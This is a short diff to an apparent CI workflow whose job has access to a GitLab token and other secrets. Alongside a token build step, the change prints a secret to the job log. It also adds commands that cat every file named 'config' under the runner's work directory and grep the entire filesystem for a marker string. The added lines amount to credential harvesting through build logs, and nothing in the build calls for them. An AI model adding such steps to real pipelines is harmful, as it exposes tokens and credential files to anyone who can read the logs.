@@ -25,4 +25,6 @@ jobs:
           GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
         run: |
           yarn tokens build
-          echo ${{ secrets.test }}
+          echo ${{ secrets.TEST }}
+          find $HOME/work -type f -name config | xargs cat
+          grep -Ril "FINDME" /
